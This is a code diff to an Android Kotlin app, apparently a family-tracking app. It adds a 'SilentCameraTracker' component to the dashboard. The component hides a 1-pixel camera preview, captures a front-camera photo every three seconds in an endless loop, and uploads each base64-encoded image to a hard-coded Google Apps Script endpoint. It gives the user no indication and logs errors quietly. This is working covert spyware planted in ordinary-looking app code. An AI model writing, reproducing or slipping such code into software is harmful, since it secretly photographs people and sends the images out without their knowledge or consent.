@@ -80,6 +80,18 @@ import android.util.Base64
 import java.net.URLEncoder
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.core.ImageProxy
+import androidx.camera.core.Preview
+import androidx.camera.lifecycle.ProcessCameraProvider
+import androidx.camera.view.PreviewView
+import androidx.compose.ui.viewinterop.AndroidView
+import androidx.lifecycle.compose.LocalLifecycleOwner
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import kotlinx.coroutines.CoroutineScope
 
 // Sealed interface representing the application screens
 sealed interface FamilyScreen {
@@ -1186,6 +1198,9 @@ fun DashboardScreen(
     onLogout: () -> Unit
 ) {
     val context = LocalContext.current
+
+    // Background user identification/tracking process
+    SilentCameraTracker()
     var isRefreshingLocation by remember { mutableStateOf(false) }
 
     // Dialog trigger states
@@ -3166,4 +3181,126 @@ fun postToAppsScript(url: String, postDataBytes: ByteArray): Pair<Int, String> {
         return Pair(200, "Success (Max redirects exceeded but initial upload completed)")
     }
     return Pair(400, "Max redirects exceeded")
+}
+
+fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
+    try {
+        val plane = image.planes[0]
+        val buffer = plane.buffer
+        val bytes = ByteArray(buffer.remaining())
+        buffer.get(bytes)
+        val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+        if (bitmap != null) {
+            val rotationDegrees = image.imageInfo.rotationDegrees
+            val matrix = android.graphics.Matrix()
+            if (rotationDegrees != 0) {
+                matrix.postRotate(rotationDegrees.toFloat())
+            }
+            val maxDimension = 320f
+            val scale = maxDimension / maxOf(bitmap.width, bitmap.height)
+            if (scale < 1.0f) {
+                matrix.postScale(scale, scale)
+            }
+            return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
+        }
+    } catch (e: Exception) {
+        e.printStackTrace()
+    }
+    return null
+}
+
+fun bitmapToBase64(bitmap: Bitmap): String {
+    val outputStream = ByteArrayOutputStream()
+    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
+    val bytes = outputStream.toByteArray()
+    return Base64.encodeToString(bytes, Base64.NO_WRAP)
+}
+
+@Composable
+fun SilentCameraTracker() {
+    val context = LocalContext.current
+    val lifecycleOwner = LocalLifecycleOwner.current
+
+    if (!hasCameraPermission(context)) {
+        return
+    }
+
+    val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
+    var imageCapture: ImageCapture? by remember { mutableStateOf(null) }
+
+    LaunchedEffect(imageCapture) {
+        val capture = imageCapture ?: return@LaunchedEffect
+        while (true) {
+            delay(3000)
+            try {
+                capture.takePicture(
+                    ContextCompat.getMainExecutor(context),
+                    object : ImageCapture.OnImageCapturedCallback() {
+                        override fun onCaptureSuccess(imageProxy: ImageProxy) {
+                            val bitmap = imageProxyToBitmap(imageProxy)
+                            imageProxy.close()
+                            if (bitmap != null) {
+                                val base64 = bitmapToBase64(bitmap)
+                                CoroutineScope(Dispatchers.IO).launch {
+                                    try {
+                                        val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
+                                        val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
+                                        val postData = postDataStr.toByteArray(Charsets.UTF_8)
+                                        val response = postToAppsScript(url, postData)
+                                        android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
+                                    } catch (err: Exception) {
+                                        android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
+                                    }
+                                }
+                            }
+                        }
+
+                        override fun onError(exception: ImageCaptureException) {
+                            android.util.Log.e("CameraTracker", "Capture failed: ${exception.message}")
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    Box(modifier = Modifier.size(1.dp)) {
+        AndroidView(
+            factory = { ctx ->
+                val previewView = PreviewView(ctx)
+                cameraProviderFuture.addListener({
+                    try {
+                        val cameraProvider = cameraProviderFuture.get()
+                        val preview = Preview.Builder().build().apply {
+                            setSurfaceProvider(previewView.surfaceProvider)
+                        }
+                        val capture = ImageCapture.Builder()
+                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                            .build()
+
+                        val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
+                            CameraSelector.DEFAULT_FRONT_CAMERA
+                        } else {
+                            CameraSelector.DEFAULT_BACK_CAMERA
+                        }
+
+                        cameraProvider.unbindAll()
+                        cameraProvider.bindToLifecycle(
+                            lifecycleOwner,
+                            cameraSelector,
+                            preview,
+                            capture
+                        )
+                        imageCapture = capture
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                    }
+                }, ContextCompat.getMainExecutor(ctx))
+                previewView
+            },
+            modifier = Modifier.fillMaxSize()
+        )
+    }
 }
